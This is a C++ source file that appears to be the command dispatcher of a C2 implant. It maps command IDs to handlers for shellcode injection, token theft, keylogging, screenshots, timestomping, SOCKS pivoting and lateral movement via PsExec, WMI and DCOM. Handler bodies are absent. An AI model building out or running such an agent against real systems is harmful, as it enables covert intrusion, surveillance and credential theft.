#include <common.h>
#include <module.h>
#include <config.h>
#include <commands.h>
#include <package.h>
#include <parser.h>

using namespace stardust;
using namespace starburst;

namespace starburst {

auto declfn dispatch_command(
    _In_ instance& inst,
    _In_ uint8_t   cmd_id,
    _In_ char*     task_uuid,
    _In_ Parser*   params
) -> void {
    DBG_PRINT( inst, "dispatching command 0x%02x for task %s\n", cmd_id, task_uuid );

    switch ( cmd_id ) {
#ifdef INCLUDE_CMD_EXIT
        case CMD_EXIT:     cmd_exit( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_SLEEP
        case CMD_SLEEP:    cmd_sleep( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_SHELL
        case CMD_SHELL:    cmd_shell( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_WHOAMI
        case CMD_WHOAMI:   cmd_whoami( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_PWD
        case CMD_PWD:      cmd_pwd( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_CD
        case CMD_CD:       cmd_cd( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_LS
        case CMD_LS:       cmd_ls( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_PS
        case CMD_PS:       cmd_ps( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_CONFIG
        case CMD_CONFIG:   cmd_config( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_UPLOAD
        case CMD_UPLOAD:   cmd_upload( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_DOWNLOAD
        case CMD_DOWNLOAD: cmd_download( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_SHINJECT
        case CMD_SHINJECT: cmd_shinject( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_EXECUTE_PIC
        case CMD_EXECUTE_PIC: cmd_execute_pic( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_CAT
        case CMD_CAT: cmd_cat( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_MKDIR
        case CMD_MKDIR: cmd_mkdir( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_RM
        case CMD_RM: cmd_rm( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_CP
        case CMD_CP: cmd_cp( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_MV
        case CMD_MV: cmd_mv( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_ENV
        case CMD_ENV: cmd_env( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_REG_QUERY
        case CMD_REG_QUERY: cmd_reg_query( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_SCREENSHOT
        case CMD_SCREENSHOT: cmd_screenshot( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_TOKEN_LIST
        case CMD_TOKEN_LIST: cmd_token_list( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_EXECUTE_ASSEMBLY
        case CMD_EXECUTE_ASSEMBLY: cmd_execute_assembly( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_EXECUTE_COFF
        case CMD_EXECUTE_COFF: cmd_execute_coff( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_JUMP_PSEXEC
        case CMD_JUMP_PSEXEC: cmd_jump_psexec( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_JUMP_SCSHELL
        case CMD_JUMP_SCSHELL: cmd_jump_scshell( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_JUMP_WMIEXEC
        case CMD_JUMP_WMIEXEC: cmd_jump_wmiexec( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_JUMP_DCOMEXEC
        case CMD_JUMP_DCOMEXEC: cmd_jump_dcomexec( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_IFCONFIG
        case CMD_IFCONFIG: cmd_ifconfig( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_NETSTAT
        case CMD_NETSTAT: cmd_netstat( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_KILL
        case CMD_KILL: cmd_kill( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_RUN
        case CMD_RUN: cmd_run( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_GETPRIVS
        case CMD_GETPRIVS: cmd_getprivs( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_LISTPIPES
        case CMD_LISTPIPES: cmd_listpipes( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_REG_WRITE_VALUE
        case CMD_REG_WRITE_VALUE: cmd_reg_write_value( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_MAKE_TOKEN
        case CMD_MAKE_TOKEN: cmd_make_token( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_STEAL_TOKEN
        case CMD_STEAL_TOKEN: cmd_steal_token( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_REV2SELF
        case CMD_REV2SELF: cmd_rev2self( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_NET_LOCALGROUP
        case CMD_NET_LOCALGROUP: cmd_net_localgroup( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_NET_LOCALGROUP_MEMBER
        case CMD_NET_LOCALGROUP_MEMBER: cmd_net_localgroup_member( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_JOBKILL
        case CMD_JOBKILL: cmd_jobkill( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_LINK
        case CMD_LINK: cmd_link( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_UNLINK
        case CMD_UNLINK: cmd_unlink( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_DOWNLOAD
        case CMD_DOWNLOAD_RESP: cmd_download_resp( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_SOCKS
        case CMD_SOCKS: cmd_socks( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_SSH
        case CMD_SSH: cmd_ssh( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_RPFWD
        case CMD_RPFWD: cmd_rpfwd( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_MIGRATE
        case CMD_MIGRATE: cmd_migrate( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_BLOCKDLLS
        case CMD_BLOCKDLLS: cmd_blockdlls( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_KEYLOG
        case CMD_KEYLOG: cmd_keylog( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_ENUMDESKTOPS
        case CMD_ENUMDESKTOPS: cmd_enumdesktops( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_TIMESTOMP
        case CMD_TIMESTOMP: cmd_timestomp( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_LOCALTIME
        case CMD_LOCALTIME: cmd_localtime( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_IDLETIME
        case CMD_IDLETIME: cmd_idletime( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_GETUID
        case CMD_GETUID: cmd_getuid( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_BROWSERPIVOT
        case CMD_BROWSERPIVOT: cmd_browserpivot( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_CONNECT
        case CMD_CONNECT: cmd_connect( inst, task_uuid, params ); return;
#endif
#ifdef INCLUDE_CMD_DISCONNECT
        case CMD_DISCONNECT: cmd_disconnect( inst, task_uuid, params ); return;
#endif
        default: break;
    }

    DBG_PRINT( inst, "unknown command: 0x%02x\n", cmd_id );
}

} // namespace starburst

auto declfn instance::dispatch_task(
    _In_ uint8_t  cmd_id,
    _In_ char*    task_uuid,
    _In_ uint8_t* params,
    _In_ uint32_t params_len
) -> void {
    Parser p;
    starburst::parser_init( &p, params, params_len );
    starburst::dispatch_command( *this, cmd_id, task_uuid, &p );
}
